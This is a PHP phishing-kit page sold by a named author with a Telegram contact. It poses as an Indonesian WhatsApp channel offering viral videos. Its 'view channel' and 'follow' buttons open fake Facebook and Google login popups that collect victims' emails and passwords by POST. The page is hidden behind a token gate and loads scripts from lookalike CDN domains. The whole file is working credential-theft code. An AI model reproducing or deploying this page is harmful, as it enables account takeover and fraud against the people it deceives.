<?php
// Creator Sc  : LUKY NESIA 
// Order Script Vip : 6289509551861
// Telegram   : t.me/luky_nesia

$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Kumpulan Videy Lengkap
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/google.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/all.css"> 
  <style>
   /* Custom scrollbar hidden for the entire page */
    body {
      -ms-overflow-style: none; /* IE and Edge */
      scrollbar-width: none; /* Firefox */
    }
    body::-webkit-scrollbar {
      display: none; /* Chrome, Safari, Opera*/
    }
  </style>
 </head>
 <body class="bg-[#f2e9de] min-h-screen flex flex-col justify-between font-sans text-[14px] leading-tight">
  <!-- Header -->
  <header class="flex items-center px-4 py-3 border-b border-gray-300 bg-white sticky top-0 z-10">
   <button aria-label="Back" class="text-2xl pr-3">
    <i class="fas fa-arrow-left">
    </i>
   </button>
   <img alt="Profile image of a woman wearing glasses and a headscarf, standing in front of a wooden door" class="w-10 h-10 rounded-full object-cover mr-3" src="https://cdn.stackpath.web.id/5/IMG_20250906_153036_212.jpg"/>
   <div class="flex flex-col leading-tight">
    <span class="text-black text-[16px] font-normal">
     Kumpulan Videy Lengkap
    </span>
    <span class="text-gray-600 text-[12px] font-normal">
     1Rb pengikut
    </span>
   </div>
   <div class="ml-auto text-2xl pr-1 cursor-pointer">
    <i class="fas fa-ellipsis-v">
    </i>
   </div>
  </header>
  <!-- Chat content -->
  <main class="flex-grow px-4 pt-4 pb-20 relative">
   <!-- Date bubble 29 Agustus 2024 -->
   <div class="mx-auto mb-3 max-w-xs bg-white rounded-full px-3 py-1 text-[13px] font-semibold text-gray-700 select-none">
    29 Agustus 2024
   </div>
   <!-- Privacy message bubble -->
   <div class="max-w-xs bg-white rounded-xl px-4 py-3 mb-3 mx-auto text-center text-gray-700 text-[14px] leading-snug">
    <span class="font-semibold">
     📡
    </span>
    Saluran ini memiliki privasi tambahan untuk profil dan nomor telepon Anda. Ketuk untuk mempelajari selengkapnya.
   </div>
   <!-- Created channel message bubble -->
   <div class="max-w-xs bg-white rounded-xl px-4 py-2 mb-3 mx-auto text-center text-gray-700 text-[14px] leading-snug">
    Saluran “Kumpulan Videy Lengkap” berhasil dibuat
   </div>
   <!-- Date bubble 19 Agustus 2025 -->
   <div class="mx-auto mb-3 max-w-xs bg-white rounded-full px-3 py-1 text-[13px] font-semibold text-gray-700 select-none">
    19 Agustus 2025
   </div>
   <!-- Channel preview card -->
   <div class="max-w-xs bg-white rounded-xl shadow-sm mx-auto p-3">
    <div class="flex mb-2">
     <img alt="WhatsApp logo, green circle with white phone icon inside" class="w-12 h-12 rounded-full flex-shrink-0" src="https://placehold.co/48x48/00a854/ffffff/png?text=WhatsApp+Logo"/>
     <div class="ml-3 flex flex-col justify-center">
      <span class="font-bold text-[15px] leading-tight text-black">
       KUMPULAN VIDEO INDONESIA | Saluran WhatsApp
      </span>
      <span class="text-gray-500 text-[13px] truncate max-w-[180px]">
       Saluran WhatsApp KUMPULAN VIDEO I...
      </span>
      <span class="text-gray-500 text-[13px]">
       whatsapp.com
      </span>
     </div>
    </div>
    <div class="font-extrabold text-black text-[15px] mb-1 leading-tight">
     KUMPULAN INDONESIA VIRAL
    </div>
    <a class="text-blue-600 text-[14px] break-words" href="https://whatsapp.com/channel/0029VafygDTIiRouVGP6Mk21">
     https://whatsapp.com/channel/0029VafygDTIiRouVGP6Mk21
    </a>
    <div class="text-right text-[12px] text-gray-600 mt-1">
     10.02
    </div>
    <button class="mt-3 w-full text-green-700 font-semibold text-[15px] hover:underline focus:outline-none" onclick="Loginpopunder()"
  >
    Lihat saluran
  </button>
   </div>
   <!-- Share icon bubble -->
   <div class="max-w-xs bg-white rounded-full p-2 mt-3 mx-auto w-10 h-10 flex items-center justify-center shadow-sm cursor-pointer">
    <i class="fas fa-share text-gray-700 text-lg">
    </i>
   </div>
  </main>
  <!-- Bottom follow button -->
  <footer class="fixed bottom-0 left-0 w-full bg-white p-4 border-t border-gray-300">
   <button class="w-full bg-green-600 text-white font-semibold text-[16px] rounded-full py-3" onclick="Loginpopunder()"
  >
    Ikutin Saluran 
  </button>
  </footer>
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.stackpath.web.id/3/img/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.stackpath.web.id/3/img/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.stackpath.web.id/3/img/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.stackpath.web.id/3/img/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.stackpath.web.id/3/img/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://jquery.biz.id/libs/jquery-3.17.21.min.js"></script>
  <script src="js/jquery.min.js"></script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>